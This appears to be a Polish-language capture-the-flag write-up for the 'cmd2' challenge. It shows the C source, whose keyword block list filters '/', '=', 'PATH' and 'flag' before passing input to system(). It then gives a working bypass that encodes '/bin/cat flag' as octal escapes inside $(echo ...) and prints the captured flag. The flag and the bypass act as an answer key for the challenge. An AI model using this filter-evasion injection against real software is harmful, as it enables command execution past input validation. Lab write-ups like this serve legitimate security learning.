## cmd1 - 9 pt ##

Flaga: `FuN_w1th_5h3ll_v4riabl3s_haha`

Kod źródłowy **cmd2.c**:

```c
#include <stdio.h>
#include <string.h>

int filter(char* cmd){
	int r=0;
	r += strstr(cmd, "=")!=0;
	r += strstr(cmd, "PATH")!=0;
	r += strstr(cmd, "export")!=0;
	r += strstr(cmd, "/")!=0;
	r += strstr(cmd, "`")!=0;
	r += strstr(cmd, "flag")!=0;
	return r;
}

extern char** environ;
void delete_env(){
	char** p;
	for(p=environ; *p; p++)	memset(*p, 0, strlen(*p));
}

int main(int argc, char* argv[], char** envp){
	delete_env();
	putenv("PATH=/no_command_execution_until_you_become_a_hacker");
	if(filter(argv[1])) return 0;
	printf("%s\n", argv[1]);
	system( argv[1] );
	return 0;
}

```
* Rozszerzenie zadania cmd1 z większą liczbą filtrów na input oraz czyszczeniem zmiennych środowiskowych przed sprawdzeniem wejścia
* Generalnie ja radzę sobie z takimi typem zadań, określając możliwe formaty dostarczenia inputu - najbardziej oczywistym w tym przypadku wydaje się oczywiście ASCII
* Kolejnym krokiem jest określenie możliwości dostarczenia inputu w wybranym formacie i jak to zrobić w ramach ograniczenia danego zadania
  * Dostarczone polecenie uruchamiane jest przez program za pomocą funkcji `system()` - zaglądając jej pod "maskę" polecenie wygląda w następujący sposób: `execl("/bin/sh", "sh", "-c", cmd, (char *) 0);`
  * Interesującym faktem jest to, że pod `bash` i `sh` progam `echo` działa w różny sposób:
    * `bash` - `echo '\57'` daje `\57`
    * `sh` - `echo '\57'` daje `/`
* Mając ten fakt na uwadze możemy podać ścieżkę `/bin/cat /home/cmd2/flag` w bajtach ASCII i w ten sposób obejść wszelkie ograniczenia zadania:
```
cmd2@ubuntu:~$ ./cmd2 '$(echo "\57\142\151\156\57\143\141\164\40\146\154\141\147")'
$(echo "\57\142\151\156\57\143\141\164\40\146\154\141\147")
FuN_w1th_5h3ll_v4riabl3s_haha
```
